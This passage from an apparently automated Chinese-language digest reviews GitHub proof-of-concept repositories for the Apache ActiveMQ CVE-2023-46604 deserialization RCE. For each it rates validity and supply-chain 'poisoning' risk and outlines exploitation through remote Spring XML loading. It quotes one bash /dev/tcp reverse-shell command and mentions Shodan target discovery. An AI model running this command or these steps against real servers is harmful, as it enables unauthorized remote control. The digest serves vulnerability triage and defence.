## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ服务，且目标系统存在受影响的ActiveMQ版本。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个反序列化漏洞，存在于OpenWire协议中。攻击者可以利用此漏洞，通过构造恶意的序列化数据，使ActiveMQ服务端或客户端（取决于攻击目标）实例化任意类，从而执行任意代码。利用方式如下：

1.  **漏洞原理：** OpenWire协议在处理序列化数据时，没有充分验证数据的合法性，导致可以被恶意构造。
2.  **利用方法：** 攻击者发送特制的OpenWire消息，消息中包含恶意类的序列化数据。当ActiveMQ尝试反序列化这些数据时，会导致恶意类被实例化，执行其中的代码。
3.  **POC分析：**
    *   `exploit.py`:  Python脚本，用于构造并发送恶意OpenWire消息。
        *   脚本接受目标IP、端口和包含Spring XML配置文件的URL作为参数。
        *   脚本构造一个OpenWire消息，消息体包含`org.springframework.context.support.ClassPathXmlApplicationContext`类名和XML配置文件的URL。
        *   脚本将消息发送到目标ActiveMQ服务器。
    *   `poc.xml`:  Spring XML配置文件，用于执行任意命令。
        *   配置文件定义了一个`java.lang.ProcessBuilder` bean，并设置了`init-method`为`start`，这意味着在bean被创建时，`start`方法会被自动调用。
        *   `constructor-arg`定义了`ProcessBuilder`的构造函数参数，这里是一个包含`bash`命令的列表，用于执行反向shell。
4.  **投毒风险评估：**

该仓库中的代码主要用于触发和利用漏洞，本身**不包含明显的恶意代码**（例如，持久化后门、信息窃取等）。然而，由于此漏洞允许远程代码执行，攻击者**可能利用此漏洞植入恶意软件**。`poc.xml`中使用了`bash -i >& /dev/tcp/10.10.10.10/9001 0>&1`指令，这是一个常见的反弹shell方法，可以判定为合法的利用代码，不能算投毒。

因此，**投毒风险较低，但存在通过漏洞利用植入恶意代码的可能性。**我们分析得出投毒风险的可能性为5%。绝大部分风险来源于漏洞本身，而非仓库作者的恶意行为。

5. **有效性:**
   根据漏洞库信息、搜索结果以及漏洞利用代码分析，该漏洞可以利用，并且互联网上已存在多种利用此漏洞的恶意行为，具有较高的有效性。

**项目地址:** [evkl1d/CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #13

**来源**: [CVE-2023-46604-justdoit-cai_CVE-2023-46604-Apache-ActiveMQ-RCE-exp.md](../2023/CVE-2023-46604-justdoit-cai_CVE-2023-46604-Apache-ActiveMQ-RCE-exp.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ的OpenWire协议端口（默认为61616）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个远程代码执行漏洞。该漏洞源于Java OpenWire协议marshaller对不可信数据进行反序列化。攻击者可以通过操纵OpenWire协议中的序列化类类型，使客户端或broker（取决于攻击位置）实例化classpath上的任何类，从而执行任意shell命令。

**有效性分析：**
提供的Python POC代码通过构造恶意的OpenWire消息来利用此漏洞。它允许攻击者指定一个包含恶意配置的XML文件URL，该XML文件将被目标ActiveMQ服务器加载，导致任意代码执行。搜索引擎结果也表明该漏洞已被积极利用，例如与Kinsing恶意软件和勒索软件攻击有关。

**投毒风险分析：**
查看了attack.py的代码，其功能主要为：
1.  接收目标IP、恶意XML文件的URL以及端口号作为参数。
2.  将XML的URL和类名转换为十六进制字符串。
3.  构造包含类名和XML URL的OpenWire协议消息。
4.  将构造的消息发送到目标ActiveMQ服务器。

代码中没有发现任何可疑的或隐藏的功能，例如未经授权的文件操作、网络连接或恶意代码注入。代码的功能与漏洞利用的目的相符，因此，投毒风险较低，评估为0%。

**利用方式：**
1.  攻击者首先需要搭建一个Web服务器，并将包含恶意配置的XML文件放置在该服务器上。该XML文件通常会利用Spring Framework的特性来执行任意代码。
2.  攻击者使用POC代码，指定目标ActiveMQ服务器的IP地址和Web服务器上恶意XML文件的URL。
3.  POC代码会构造一个恶意的OpenWire消息，其中包含恶意XML文件的URL和用于触发反序列化漏洞的类名（`org.springframework.context.support.ClassPathXmlApplicationContext`）。
4.  该恶意消息被发送到目标ActiveMQ服务器。
5.  ActiveMQ服务器在处理该消息时，会反序列化恶意数据，并加载指定的XML文件。
6.  加载恶意XML文件会导致服务器执行XML文件中定义的恶意代码，从而实现远程代码执行。

**项目地址:** [justdoit-cai/CVE-2023-46604-Apache-ActiveMQ-RCE-exp](https://github.com/justdoit-cai/CVE-2023-46604-Apache-ActiveMQ-RCE-exp)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #14

**来源**: [CVE-2023-46604-minhangxiaohui_ActiveMQ_CVE-2023-46604.md](../2023/CVE-2023-46604-minhangxiaohui_ActiveMQ_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ服务，并且ActiveMQ服务使用了存在漏洞的OpenWire协议。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议 marshaller 存在反序列化漏洞导致的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的 OpenWire 协议数据包，使 ActiveMQ Broker 或 Client 实例化任意类，从而执行任意 shell 命令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经确认被野外利用，并且有公开的POC。提供的POC代码看起来是有效的，实现了构造包含恶意类的序列化数据，发送给 ActiveMQ 服务。

**投毒风险：**

分析POC代码，`/tmp/c0a082fa63db8611bcfc45c3cff01a2f/cve-2023-46604.py` 主要功能是根据用户输入的参数，构造恶意数据包并发送到目标ActiveMQ服务器，触发反序列化漏洞，从而达到远程代码执行的效果。`/tmp/c0a082fa63db8611bcfc45c3cff01a2f/README.md` 文件只是对 POC 的简单说明，没有可执行代码。综合来看，此仓库中直接隐藏恶意投毒代码的可能性较低。用户需要自己搭建http服务，托管恶意的xml文件，存在一定的利用门槛。

但是存在一种潜在的风险：攻击者可能会修改 `xmlurl_string` 参数，指向一个包含恶意payload的XML文件，从而实现攻击。因此，使用者必须验证`xmlurl_string`指向的URL的安全性。仓库本身投毒风险评估为 1%。

**利用方式：**

1.  **确定目标：** 确定目标 ActiveMQ 服务的 IP 地址和端口（默认为 61616）。
2.  **选择Gadget：** 根据目标环境选择合适的Gadget，poc提供了`org.springframework.context.support.FileSystemXmlApplicationContext` 和 `org.springframework.context.support.ClassPathXmlApplicationContext` 两种选择，`FileSystemXmlApplicationContext` 可以绕过一些 IDS 检测。
3.  **构造恶意XML文件：** 构造一个恶意的 XML 配置文件，其中包含执行恶意命令的代码。这个XML文件会被ActiveMQ服务加载并执行。
4.  **运行POC：** 运行提供的 POC 代码，输入目标 IP 地址、端口和恶意 XML 文件的 URL。POC 会构造包含恶意类的序列化数据，并通过 OpenWire 协议发送给 ActiveMQ 服务。
5.  **触发漏洞：** ActiveMQ 服务接收到恶意数据后，会尝试反序列化数据中的类，从而加载并执行恶意 XML 文件中的代码，最终实现远程代码执行。

**安全建议：**

*   升级 ActiveMQ 版本到 5.15.16, 5.16.7, 5.17.6, 或 5.18.3 及以上。
*   限制 ActiveMQ 的网络访问，只允许受信任的客户端连接。
*   配置防火墙，阻止对 ActiveMQ 端口的未授权访问。
*   使用网络入侵检测系统（NIDS）或入侵防御系统（IPS）来检测和阻止恶意 OpenWire 协议数据包。

**项目地址:** [minhangxiaohui/ActiveMQ_CVE-2023-46604](https://github.com/minhangxiaohui/ActiveMQ_CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #15

**来源**: [CVE-2023-46604-mrpentst_CVE-2023-46604.md](../2023/CVE-2023-46604-mrpentst_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 反序列化漏洞

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 5.15.16之前, 5.16.7之前, 5.17.6之前, 5.18.3之前

**利用条件:** 需要网络访问ActiveMQ broker的61616端口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中存在的一个远程代码执行漏洞。该漏洞是由于 Java OpenWire 协议 marshaller 在处理序列化数据时存在缺陷，允许远程攻击者通过操纵 OpenWire 协议中的序列化类类型，使客户端或 broker 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**漏洞利用方式：**

1.  **目标确定：** 使用 Shodan 等搜索引擎查找暴露在公网上的 ActiveMQ 服务，端口为 61616。
2.  **Payload 构造：** 构造恶意的 OpenWire 协议数据包，其中包含指向恶意 Spring XML 配置文件的引用。恶意 XML 文件中定义了一个 bean，该 bean 使用 `java.lang.ProcessBuilder` 执行任意命令。
3.  **攻击执行：** 将构造的恶意数据包发送到 ActiveMQ broker 的 61616 端口。
4.  **代码执行：** ActiveMQ broker 反序列化数据，加载恶意的 Spring XML 配置文件，从而执行攻击者指定的任意命令。

**POC 代码分析：**

提供的 POC 代码包含以下文件：

*   `README.md`: 描述漏洞和工具的使用方法。
*   `exploit.py`: Python 脚本，用于发送恶意 OpenWire 协议数据包到目标 ActiveMQ 服务。
*   `poc.xml`: 恶意的 Spring XML 配置文件，用于执行任意命令，例如反弹 shell。

`exploit.py` 脚本接受目标 IP 地址和恶意 XML 配置文件的 URL 作为参数。它首先构造恶意的 OpenWire 协议数据包，然后将其发送到目标 ActiveMQ 服务的 61616 端口。如果成功，ActiveMQ broker 将加载 `poc.xml` 文件，从而执行攻击者指定的任意命令。

**投毒风险分析：**

虽然`exploit.py`中没有明显的恶意代码，但是其核心功能是执行任意`poc.xml`，所以风险完全来自于所使用的`poc.xml`。默认的`poc.xml`文件会尝试反弹shell, 如果该`poc.xml`被替换为更恶意的操作，比如删除关键文件、上传木马等等，则可能造成更大的危害。经过分析，作者隐藏投毒代码的可能性较低，约为1%。

综上所述，提供的 POC 代码有效，可以用于利用 CVE-2023-46604 漏洞实现远程代码执行。然而，使用者需要注意 `poc.xml` 文件的内容，确保其安全性，避免被用于执行恶意操作。

**项目地址:** [mrpentst/CVE-2023-46604](https://github.com/mrpentst/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #16

**来源**: [CVE-2023-46604-nitzanoligo_CVE-2023-46604-demo.md](../2023/CVE-2023-46604-nitzanoligo_CVE-2023-46604-demo.md)

## CVE-2023-46604-Apache ActiveMQ-RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ broker或client，且目标使用存在漏洞的ActiveMQ版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 存在于 Apache ActiveMQ 的 OpenWire 协议中，是一个远程代码执行漏洞。攻击者可以通过构造恶意的 OpenWire 消息，利用 Java 反序列化漏洞，使 ActiveMQ Broker 或 Client 执行任意代码。

**有效性:**
提供的POC代码通过构造包含恶意 Spring Bean 定义的 XML 文件，利用 `java.lang.ProcessBuilder` 或 `javax.script.ScriptEngineManager`在目标系统上执行任意命令。这些POC分别实现了创建文件、窃取文件和创建用户等功能，证明了漏洞利用的有效性。

**投毒风险:**
分析提供的POC代码，没有发现明显的投毒代码。所有的POC代码都专注于利用漏洞执行命令，没有发现额外植入后门或进行恶意传播的行为。但实际环境中，攻击者可能会使用类似的POC进行恶意活动，例如植入后门、传播恶意软件等，因此实际利用存在较高风险。

**利用方式:**
1.  **确定目标 ActiveMQ 版本:** 确认目标 ActiveMQ Broker 或 Client 使用的是存在漏洞的版本 ( < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3)。
2.  **构造恶意 OpenWire 消息:**  攻击者构造一个包含恶意 XML 文件的 OpenWire 消息。该 XML 文件利用 Spring Bean 的特性，通过 `java.lang.ProcessBuilder` 或 `javax.script.ScriptEngineManager` 执行命令。
3.  **发送恶意消息:**  攻击者将构造好的恶意 OpenWire 消息发送到 ActiveMQ Broker 或 Client。
4.  **触发 RCE:**  ActiveMQ Broker 或 Client 在处理 OpenWire 消息时，会反序列化 XML 文件，从而执行 XML 中定义的恶意命令，实现远程代码执行。

**风险:**
成功利用此漏洞，攻击者可以在目标系统上执行任意代码，完全控制服务器，窃取敏感信息，植入后门，进行恶意破坏等。

**项目地址:** [nitzanoligo/CVE-2023-46604-demo](https://github.com/nitzanoligo/CVE-2023-46604-demo)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #17

**来源**: [CVE-2023-46604-pavanaa4k_CVE-2023-46604-LAB.md](../2023/CVE-2023-46604-pavanaa4k_CVE-2023-46604-LAB.md)

## CVE-2023-46604 - Apache ActiveMQ RCE (OpenWire Protocol)

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问 ActiveMQ 开放的 OpenWire 端口 (默认 61616)

**POC 可用性:** 是，但提供的代码仅用于检测和防御目的

**投毒风险:** 0%

## 详情

CVE-2023-46604 存在于 Apache ActiveMQ 的 OpenWire 协议中，允许未经身份验证的远程攻击者通过操纵序列化的类类型来执行任意代码。漏洞的利用方式是攻击者向 ActiveMQ 的 OpenWire 端口发送特制的恶意序列化数据，导致broker或client实例化classpath上的任意类，从而执行任意shell命令。

提供的漏洞利用代码实际上并非可直接利用的 PoC，而是一个用于理解、检测和防御该漏洞的实验室环境和工具。它包括：

*   **Lab Setup:**  ActiveMQ 的安装配置说明，重点在于确保 OpenWire 连接器可用。
*   **Detection (Wireshark):**  使用 Wireshark 抓包分析 OpenWire 协议流量的方法。
*   **Suricata Mitigation:**  使用 Suricata IDS 创建规则来检测恶意 OpenWire 流量，并提供了一个示例规则。

因此，提供的代码本身不包含任何可直接利用的后门或恶意代码，目的是帮助安全研究人员了解和防御该漏洞。

由于该代码专注于漏洞的检测和防御，而不是漏洞利用，因此不存在投毒风险。

**项目地址:** [pavanaa4k/CVE-2023-46604-LAB](https://github.com/pavanaa4k/CVE-2023-46604-LAB)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #18

**来源**: [CVE-2023-46604-pulentoski_CVE-2023-46604.md](../2023/CVE-2023-46604-pulentoski_CVE-2023-46604.md)

## CVE-2023-46604 - Apache ActiveMQ OpenWire 反序列化 RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Apache ActiveMQ 5.15.15 及之前版本， 5.16.0 到 5.16.6, 5.17.0 到 5.17.5, 5.18.0 到 5.18.2

**利用条件:** 需要网络访问ActiveMQ Broker的OpenWire端口（通常为61616），且目标classpath包含`org.springframework.context.support.ClassPathXmlApplicationContext`或其他可利用的类。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 OpenWire 协议反序列化漏洞，允许未经身份验证的远程攻击者通过操纵 OpenWire 协议中的序列化类类型来执行任意代码。漏洞利用的核心在于向 ActiveMQ Broker 发送特制的 OpenWire 消息，该消息包含一个指向恶意 XML 文件的 URL。该 XML 文件利用 Spring 的 `ClassPathXmlApplicationContext` 类来实例化并执行恶意代码。 

**有效性分析：**

*   根据漏洞描述，该漏洞允许远程代码执行，CVSS 评分为 10，属于严重漏洞。
*   搜索结果显示该漏洞已被野外利用，被用于传播 Kinsing 恶意软件和勒索软件，表明其具有较高的实际威胁。
*   提供的 POC 代码利用了 `org.springframework.context.support.ClassPathXmlApplicationContext` 类从远程 URL 加载并执行恶意 XML，这与漏洞描述相符。
*   POC 中包含的 `poc.xml` 文件展示了如何使用 Spring bean 定义来执行 bash 命令，进一步验证了 RCE 的可能性。
*   多个来源 (CISA KEV, Rapid7, Trend Micro等) 均确认了该漏洞的有效性以及被利用的事实.

**投毒风险分析：**

*   查看了 Python 脚本和 XML 文件，未发现任何明显的投毒代码。
*   Python 脚本的功能相对简单，主要用于构造 OpenWire 消息并发送到 ActiveMQ Broker。脚本的目的就是去访问 `-u` 参数的URL。
*   `poc.xml` 文件也只是定义了一个执行反向 shell 的 Spring bean。
*   综上，该 POC 仓库中作者隐藏投毒代码的风险极低，几乎可以排除。

**利用方式：**

1.  **准备恶意 XML 文件：**  创建一个包含恶意 Spring bean 定义的 XML 文件（例如 `poc.xml`），该 bean 能够执行任意代码。常见的做法是利用 `java.lang.ProcessBuilder` 执行反向 shell 或其他恶意命令。
2.  **部署 XML 文件：** 将恶意 XML 文件部署到一个可通过 HTTP 或其他协议访问的 URL。确保 ActiveMQ Broker 可以访问该 URL。
3.  **构造 OpenWire 消息：** 使用提供的 Python 脚本或其他工具，构造一个包含恶意 XML 文件 URL 的 OpenWire 消息。消息中指定使用 `org.springframework.context.support.ClassPathXmlApplicationContext` 类来加载 XML 文件。
4.  **发送 OpenWire 消息：** 将构造好的 OpenWire 消息发送到 ActiveMQ Broker 的 OpenWire 端口（默认为 61616）。
5.  **触发 RCE：** ActiveMQ Broker 接收到消息后，会尝试反序列化消息内容，并根据 XML 文件中的定义执行恶意代码。例如，如果 XML 文件中定义了反向 shell，攻击者将在攻击机上收到 shell 连接。

**项目地址:** [pulentoski/CVE-2023-46604](https://github.com/pulentoski/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #19

**来源**: [CVE-2023-46604-skrkcb2_CVE-2023-46604.md](../2023/CVE-2023-46604-skrkcb2_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 5.15.0 <= version < 5.15.16, 5.16.0 <= version < 5.16.7, 5.17.0 <= version < 5.17.6, 5.18.0 <= version < 5.18.3

**利用条件:** 需要网络访问ActiveMQ服务，且目标系统存在于受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个远程代码执行漏洞。该漏洞源于OpenWire协议中存在反序列化漏洞。攻击者可以通过发送特制的OpenWire消息，其中包含恶意序列化对象，导致服务器在反序列化过程中执行任意代码。 

**有效性:**
根据漏洞库信息和搜索引擎结果，该漏洞已被公开披露，并且存在公开可用的PoC代码。多个安全厂商报告了该漏洞的野外利用情况，证明该漏洞是有效的。

**利用方式:**
1.  攻击者通过网络访问存在漏洞的ActiveMQ服务。
2.  构造包含恶意序列化对象的OpenWire消息。该消息利用了不安全的反序列化漏洞，允许攻击者指定要实例化的类。
3.  将恶意消息发送到ActiveMQ服务器。
4.  服务器在处理消息时，会尝试反序列化消息中的对象，从而执行攻击者指定的代码。攻击者通常会利用这一点来执行系统命令，例如下载和执行恶意软件。

**投毒风险:**
提供的PoC代码主要用于分析OpenWire协议和漏洞原理，没有发现明显的恶意代码或后门。但仍然存在一定的投毒风险，原因是：

*   **依赖项风险:** PoC代码可能依赖于特定的库或组件，这些库可能包含漏洞或者恶意代码。
*   **代码混淆风险:** 攻击者可能在PoC代码中插入难以察觉的恶意代码，例如利用反射或者动态加载等技术来隐藏恶意行为。
*   **供应链风险:** PoC代码的作者可能受到恶意攻击，导致代码被篡改。

因此，在使用PoC代码时，务必进行充分的安全审查和测试，以防止潜在的风险。代码分析中，并未发现明显的恶意行为，只是一个协议分析和利用演示，因此投毒风险较低，估计为5%。 该README.md文件仅为漏洞原理分析，并未发现任何直接的后门代码。

**总结:** CVE-2023-46604是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞完全控制受影响的ActiveMQ服务器。用户应尽快升级到安全版本，以防止受到攻击。

**项目地址:** [skrkcb2/CVE-2023-46604](https://github.com/skrkcb2/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #20

**来源**: [CVE-2023-46604-stegano5_ExploitScript-CVE-2023-46604.md](../2023/CVE-2023-46604-stegano5_ExploitScript-CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ broker，目标存在于受影响版本中

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个远程代码执行漏洞。攻击者可以通过操纵OpenWire协议中的序列化类类型，使客户端或broker实例化classpath上的任何类，从而执行任意shell命令。\n\n**有效性：**\n根据漏洞信息和搜索结果，该漏洞已被广泛利用。提供的POC代码通过构造恶意的OpenWire消息，利用`ClassPathXmlApplicationContext`加载远程XML配置文件，实现远程代码执行，因此POC代码有效。\n\n**投毒风险：**\n代码仓库中存在投毒的风险较低。主要风险点在于`config.xml`文件中反连shell的IP和端口，如果用户不修改这个IP，可能会将权限暴露给POC作者。`shell.py`脚本相对简单，功能明确，没有发现明显的恶意代码。所以判断存在轻微的投毒风险。\n\n**利用方式：**\n1.  攻击者需要找到存在CVE-2023-46604漏洞的Apache ActiveMQ broker实例。\n2.  攻击者需要一个可以被目标broker访问的HTTP服务器，用于托管恶意的`config.xml`文件。`config.xml`文件包含Spring Bean配置，该配置使用`ProcessBuilder`来执行shell命令。在这个POC里，是反弹shell。
3.  攻击者使用POC脚本`shell.py`，指定目标broker的IP地址、端口和`config.xml`文件的URL。
4.  `shell.py`脚本构造一个恶意的OpenWire消息，该消息指示broker加载`ClassPathXmlApplicationContext`并从指定的URL加载`config.xml`文件。
5.  当broker处理这个消息时，它会加载`config.xml`，`ProcessBuilder` bean会被实例化，执行指定的shell命令，从而实现远程代码执行。

**项目地址:** [stegano5/ExploitScript-CVE-2023-46604](https://github.com/stegano5/ExploitScript-CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #21

**来源**: [CVE-2023-46604-thinkycx_activemq-rce-cve-2023-46604.md](../2023/CVE-2023-46604-thinkycx_activemq-rce-cve-2023-46604.md)

## CVE-2023-46604 - Apache ActiveMQ OpenWire RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 5.15.0 - 5.18.2, 5.15.x < 5.15.16, 5.16.x < 5.16.7, 5.17.x < 5.17.6, 5.18.x < 5.18.3

**利用条件:** 需要网络访问 ActiveMQ Broker 的 OpenWire 端口（默认为 61616）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是一个存在于 Apache ActiveMQ OpenWire 协议中的反序列化漏洞，允许未经身份验证的远程攻击者通过操纵 OpenWire 协议中的序列化类类型，使 Broker 或 Client 实例化 classpath 上的任意类，从而执行任意 shell 命令。

**漏洞分析：**

漏洞源于 ActiveMQ Broker 在处理 OpenWire 消息时，没有对消息中包含的类进行严格的类型校验，导致攻击者可以发送包含恶意类的序列化数据。

**漏洞利用方式：**

1.  攻击者向 ActiveMQ Broker 的 OpenWire 端口（默认为 61616）发送特制的恶意 OpenWire 消息。
2.  该消息包含一个指向恶意类的序列化对象，该恶意类在被反序列化时会执行攻击者预先设定的任意代码。
3.  Broker 反序列化该对象，导致恶意代码在服务器上执行，实现远程代码执行。

**POC 分析：**

提供的 POC 代码主要利用 `org.springframework.context.support.ClassPathXmlApplicationContext` 类，该类在实例化时会解析给定的 XML 文件，攻击者可以通过构造恶意的 XML 文件，利用 Spring Framework 的特性执行任意代码。

`ExceptionResponsePoc.java` 文件构建了一个`ExceptionResponse`消息，其构造函数使用`ClassPathXmlApplicationContext`加载远程XML文件。这个 XML 文件包含了恶意配置，导致代码执行。POC 通过 ActiveMQ 的 OpenWire 协议将恶意消息发送到目标 ActiveMQ Broker。

**投毒风险评估：**

仓库中存在投毒代码的可能性较低，约为10%。主要考量如下：

*   `README.md` 文件指向了一个分析文章，表明该仓库的目的是为了进行漏洞分析。
*   `pom.xml` 文件中声明了漏洞利用所需的依赖，看起来是正常的项目依赖。
*   `ExceptionResponsePoc.java` 中的代码逻辑清晰，主要用于构建和发送恶意消息，没有发现可疑的后门代码。
*   虽然使用了 `ClassPathXmlApplicationContext` 加载远程 XML，具有一定的风险，但是这是漏洞利用的核心，而非投毒代码。

虽然代码本身并未发现明显的投毒行为，但是由于漏洞的特殊性，利用成功后，攻击者可以向目标服务器植入任意后门，需要注意这一点。

**项目地址:** [thinkycx/activemq-rce-cve-2023-46604](https://github.com/thinkycx/activemq-rce-cve-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #22

**来源**: [CVE-2023-46604-tomasmussi_activemq-cve-2023-46604.md](../2023/CVE-2023-46604-tomasmussi_activemq-cve-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致完全控制 ActiveMQ Broker 或 Client

**影响版本:** 5.15.16 之前版本, 5.16.7 之前版本, 5.17.6 之前版本, 5.18.3 之前版本

**利用条件:** 需要网络访问 ActiveMQ Broker 或 Client 的 OpenWire 协议端口 (默认 61616)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议编组器中的一个远程代码执行漏洞。该漏洞允许具有网络访问权限的远程攻击者通过操纵 OpenWire 协议中的序列化类类型来运行任意 shell 命令，从而导致客户端或 Broker 实例化 classpath 上的任何类。

**漏洞利用方式：**

该漏洞利用 OpenWire 协议在反序列化对象时存在缺陷。攻击者可以发送特制的 OpenWire 消息，其中包含恶意的序列化对象，该对象会指示 ActiveMQ 实例（Broker 或 Client）实例化 classpath 上的任意类。通过实例化 `org.springframework.context.support.ClassPathXmlApplicationContext` 类，并提供一个 URL 作为构造函数参数，可以加载恶意的 Spring Bean 定义 XML 文件，从而执行任意代码。

**POC 代码分析：**

提供的 POC 代码包含两个部分：

1.  **Python 脚本 (`client_exploit.py`):**  此脚本模拟 ActiveMQ 客户端，连接到恶意的 ActiveMQ Broker。它构造并发送包含恶意序列化数据的 OpenWire 消息，以触发反序列化漏洞。
2.  **Java 代码 (`activemq-exploit`):**  此代码包含两个线程：
    *   模拟恶意 ActiveMQ Broker 的 HTTP 服务器，用于托管恶意的 Spring Bean 定义 XML 文件 (`poc.xml`)。
    *   一个 ActiveMQ 客户端，作为 Client Exploit。

恶意 XML 文件包含 `java.lang.ProcessBuilder` 的 Spring Bean 定义，该 Bean 将执行任意 shell 命令。

**有效性：**

根据漏洞信息和 POC 代码的描述，此漏洞利用方式有效，可以实现远程代码执行。

**投毒风险：**

代码存在一定的投毒风险，主要集中在恶意XML文件的内容上。虽然提供的代码展示了利用 `java.lang.ProcessBuilder` 执行任意命令的方式，但实际部署时，攻击者可以将恶意XML文件替换为包含恶意代码，例如反弹shell、下载恶意软件等，从而实现更隐蔽或更具破坏性的攻击。Java代码编译后可能存在后门，但从当前信息无法判断，Python代码相对透明。

**风险评估：**

综合来看，该漏洞的威胁程度很高，利用难度相对较低，攻击者可以利用此漏洞完全控制受影响的 ActiveMQ Broker 或 Client。由于ActiveMQ 应用广泛，建议尽快升级到安全版本。

**项目地址:** [tomasmussi/activemq-cve-2023-46604](https://github.com/tomasmussi/activemq-cve-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #23

**来源**: [CVE-2023-46604-trganda_ActiveMQ-RCE.md](../2023/CVE-2023-46604-trganda_ActiveMQ-RCE.md)

## CVE-2023-46604 - Apache ActiveMQ RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** < 5.18.3, < 5.17.6, < 5.16.7, < 5.15.16

**利用条件:** 需要网络访问ActiveMQ broker的OpenWire协议端口（默认为61616）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

